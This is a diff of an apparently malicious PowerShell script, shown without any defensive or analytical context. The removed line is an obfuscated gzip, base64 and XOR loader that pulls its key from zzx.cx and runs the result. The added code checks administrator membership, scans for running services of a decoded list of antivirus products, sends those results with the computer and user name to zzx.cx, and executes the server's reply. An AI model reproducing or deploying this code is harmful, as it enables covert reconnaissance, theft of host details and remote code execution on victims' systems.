@@ -1,1 +1,63 @@
-$Basedata=[Convert]::FromBase64String("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");$BαseDαta = (i"r"m zzx"."cx/i"r"m"?"i="1");$BaseDatα=New-Object System.IO.MemoryStream;$BaseDatα.Write($Basedata,0,$Basedata.Length);$BaseDatα.Seek(0,0);$BαseData=New-Object System.IO.Compression.GZipStream($BaseDatα,[System.IO.Compression.CompressionMode]::Decompress);$BaseDαta=New-Object System.IO.StreamReader($BαseData);$BαseDαtα=$BaseDαta.ReadToEnd();$BaseDαta.Close();$BαseData.Close();$BaseDαtα=[Convert]::FromBase64String($BαseDαtα);$BαseDatα=[System.Text.Encoding]::UTF8.GetString((0..($BaseDαtα.Length-1)|%{$BaseDαtα[$_] -bxor [byte]$BαseDαta[$_%$BαseDαta.Length]}));iex $BαseDatα;
+$ads = ""
+try {
+    $adm = ((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount])).Value.Split('\')[-1]
+    $go = net localgroup $adm 2>&1
+    $m = $go -split "`r`n" |
+         Select-String '^-----' -Context 0,1000 |
+         ForEach-Object { $_.Context.PostContext } |
+         ForEach-Object { $_.Trim() } |
+         Where-Object { $_ -and ($_ -notmatch '命令成功完成|The command completed successfully') }
+
+    if ($m -contains $Env:UserName) {
+        $ads = "TRUE"
+    }
+    else {
+        $ads = "FALSE"
+    }
+}
+catch {
+    $ads = "CANT_CHECK_USER"
+    $em = "Error checking admin group: $($_.Exception.Message)"
+    iex -Uri "https://zzx.cx/report1.php?error=$([uri]::EscapeDataString($em))" -ErrorAction SilentlyContinue
+}
+function rev {
+    param([string]$inp)
+    $char = $inp.ToCharArray()
+    [array]::Reverse($char)
+    return -join $char
+}
+$b64Data = "J3Jlbm9aJywndG5pb1Aga2NlaEMgeWIgbXJhbEFlbm9aJywnYXlsbGlaJywneGVkbmFZJywncmVkbmVmZUQgc3dvZG5pVycsJ3Rvb3JiZVcnLCd0b29yYmVXJywneWdvbG9uaGNlVCB3YXNyYVcnLCdUSXJpVicgICAgCiwndG9ib1JpVicsJ0VSUElWJywnMjNBQlYnLCdsbGFDZXN1b0gtb3JjaU1kbmVyVCcsJ29yY2lNZG5lclQnLCd4aWxsZXJUJywnZW5pbXBhclQnLCd0bmVjbmVUJywnU0lSVEhFVCcgICAgCiwnTk9ZSENBVCcsJ2NldG5hbXlTJywnc29ocG9TJywnZW5PbGVuaXRuZVMnLCdlZ0FlcnVjZVMnLCdvcmVaIGVuaWduRSByb2ZnbmFTJywnZXJhd3lwU2l0bkFSRVBVUycsJ2duaXNpUicgICAgCiwnbGFlSGtjaXVRJywnYWRuYVAnLCdza3Jvd3RlTiBvdGxBIG9sYVAnLCd3b2xmdGVOJywnbm90cm9OJywnc3VyaXZpdG5BLU9OQU4nLCdub2l0aWRFLVdHLWVlZkFjTScsJ2VlZkFjTScgICAgCiwnZXJ1Y2VTeGFNJywnc2V0eWJlcmF3bGFNJywnWEFNJywnY2lub2lMJywndGZvc2duaUsnLCdzdXJpdi1pdG5BIHlrc3JlcHNhSycsJ1dHN0snLCdzdXJpVml0bkE3SycgICAgCiwnbmltZ25haUonLCdzdXJha0knLCd0Zm9zbmlkaXJHJywnZWxnb29HJywnYXRhREcnLCdBVEFEIEcnLCd0ZW5pdHJvRicsJ2VydWNlUy1GJywndGZvc2lzbUUnLCdjaXRzYWxFJywnbmFjU2UnICAgIAosJ3RuaW9wZG5FIE1TRScsJzIzRE9OLVRFU0UnLCdiZVdyRCcsJ0FCUCBsbGVEJywnbmVyeUMnLCd0ZW55QycsJ2VjbmFseUMnLCdub3NhZXJlYnlDJywnbm9jbGFGIGVraXJ0U2R3b3JDJyAgICAKLCdvZG9tb0MnLCdWQW1hbEMnLCdDTUMnLCdvclAgdmFrQicsJ2F0ZWhUcmVkbmVmZUR0aUInLCdyZWRuZWZlRHRpQicsJ3VkaWFCJywnYXJpdkEnLCd0c2F2QScgICAgCiwndGliYWNyQScsJ0xWQS15aXRuQScsJ2FiYWJpbEEnLCczVi1iYUxuaEEnLCdlcmF3QS1kQScsJ3Npbm9yY0EnLCdzdXJpdml0bkEgR1ZBJywnY2FZTEEnLCcwNjMn"
+$Basee = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64Data)) -split ','
+$found = @()
+foreach ($obs in $Basee) {
+    $avs = rev $obs
+    try {
+        $services = Get-Service -DisplayName "$avs*" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq 'Running' }
+        foreach ($svc in $services) {
+            if ($svc.DisplayName) {
+                $found += $svc.DisplayName
+            }
+        }
+    }
+    catch {
+        $em = "Error checking '$avs': $($_.Exception.Message)"
+        iex -Uri "https://zzx.cx/report1.php?error=$([uri]::EscapeDataString($em))" -ErrorAction SilentlyContinue
+    }
+}
+if ($found.Count -eq 0) {
+    $found = @("ZERO_FOUND")
+}
+$avsRep = [string]::Join(", ", $found)
+$whoami = "$env:COMPUTERNAME\$env:USERNAME"
+try {
+    $uri = "https://zzx.cx/report1.php?r=$([uri]::EscapeDataString($avsRep))&u=$([uri]::EscapeDataString($ads))&who=$([uri]::EscapeDataString($whoami))"
+    $response = irm -Uri $uri -ErrorAction Stop
+    Start-Sleep -Seconds 2
+    iex $response
+}
+catch {
+    $em = "Error executing redirection: $($_.Exception.Message)"
+    iex -Uri "https://zzx.cx/report1.php?error=$([uri]::EscapeDataString($em))" -ErrorAction SilentlyContinue
+}
+
+
